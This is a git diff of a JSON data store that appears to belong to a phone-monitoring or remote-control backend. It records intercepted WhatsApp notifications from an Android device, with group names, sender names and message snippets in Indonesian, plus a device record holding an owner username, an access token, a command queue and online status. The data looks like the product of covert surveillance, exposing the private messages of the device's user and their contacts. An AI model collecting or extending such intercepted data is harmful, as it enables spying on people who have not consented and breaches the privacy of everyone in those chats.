@@ -22,6 +22,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1731 pesan dari 19 chat",
+        "time": "29/04 20:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777466344959
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙅𝙊𝙈𝙊𝙆𝙀𝙍𝙎 𝘼𝙍𝙀𝘼 𝙋𝙀𝙉𝙂𝙃𝙔𝙏𝘼𝙈𝘼𝙉⚔️👑 (650 pesan): ~ ridal gosling",
+        "content": "💟 Stiker",
+        "time": "29/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777466341107
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (304 pesan): ~ Rey Market",
+        "content": "Wkwk mau beli es cekek gada duit dia",
+        "time": "29/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777466341044
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (321 pesan): ~ ~",
+        "content": "Menyebut grup Anda secara privat di status",
+        "time": "29/04 20:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777466341017
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (79 pesan): ~ Rangga",
         "content": "💟 Stiker",
         "time": "29/04 20:49",
@@ -3987,38 +4019,6 @@
         "time": "29/04 20:43",
         "pkg": "com.whatsapp",
         "receivedAt": 1777465976153
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟒 ||  𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (73 pesan): ~ Yeye",
-        "content": "📷 ‎2 foto",
-        "time": "29/04 20:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777465976110
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (13 pesan): ~ byan/XOX/002/CLN/SKY⁸⁹",
-        "content": "💟 Stiker",
-        "time": "29/04 20:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777465975255
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1568 pesan dari 19 chat",
-        "time": "29/04 20:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777465975224
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (30 pesan): ~ Jus' Know ✌️🥀",
-        "content": "💟 Stiker",
-        "time": "29/04 20:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777465973005
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777466340581,
+    "lastSeen": 1777466343180,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
